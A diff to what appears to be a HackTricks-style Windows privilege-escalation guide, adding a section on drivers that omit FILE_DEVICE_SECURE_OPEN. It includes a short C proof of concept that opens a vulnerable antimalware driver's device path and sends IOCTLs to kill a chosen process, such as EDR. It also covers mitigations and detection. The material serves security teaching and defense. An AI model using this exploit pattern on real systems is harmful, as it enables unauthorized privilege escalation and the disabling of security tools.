@@ -748,6 +748,40 @@ If a driver exposes an arbitrary kernel read/write primitive (common in poorly d
 arbitrary-kernel-rw-token-theft.md
 {{#endref}}
 
+#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)
+
+Some signed third‑party drivers create their device object with a strong SDDL via IoCreateDeviceSecure but forget to set FILE_DEVICE_SECURE_OPEN in DeviceCharacteristics. Without this flag, the secure DACL is not enforced when the device is opened through a path containing an extra component, letting any unprivileged user obtain a handle by using a namespace path like:
+
+- \\ .\\DeviceName\\anything
+- \\ .\\amsdk\\anyfile (from a real-world case)
+
+Once a user can open the device, privileged IOCTLs exposed by the driver can be abused for LPE and tampering. Example capabilities observed in the wild:
+- Return full-access handles to arbitrary processes (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
+- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks).
+- Terminate arbitrary processes, including Protected Process/Light (PP/PPL), allowing AV/EDR kill from user land via kernel.
+
+Minimal PoC pattern (user mode):
+```c
+// Example based on a vulnerable antimalware driver
+#define IOCTL_REGISTER_PROCESS  0x80002010
+#define IOCTL_TERMINATE_PROCESS 0x80002048
+
+HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
+DWORD me = GetCurrentProcessId();
+DWORD target = /* PID to kill or open */;
+DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
+DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
+```
+
+Mitigations for developers
+- Always set FILE_DEVICE_SECURE_OPEN when creating device objects intended to be restricted by a DACL.
+- Validate caller context for privileged operations. Add PP/PPL checks before allowing process termination or handle returns.
+- Constrain IOCTLs (access masks, METHOD_*, input validation) and consider brokered models instead of direct kernel privileges.
+
+Detection ideas for defenders
+- Monitor user-mode opens of suspicious device names (e.g., \\ .\\amsdk*) and specific IOCTL sequences indicative of abuse.
+- Enforce Microsoft’s vulnerable driver blocklist (HVCI/WDAC/Smart App Control) and maintain your own allow/deny lists.
+
 
 ## PATH DLL Hijacking
 
@@ -1847,5 +1881,7 @@ C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the 
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)
 
 - [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
+
+- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
 
 {{#include ../../banners/hacktricks-training.md}}
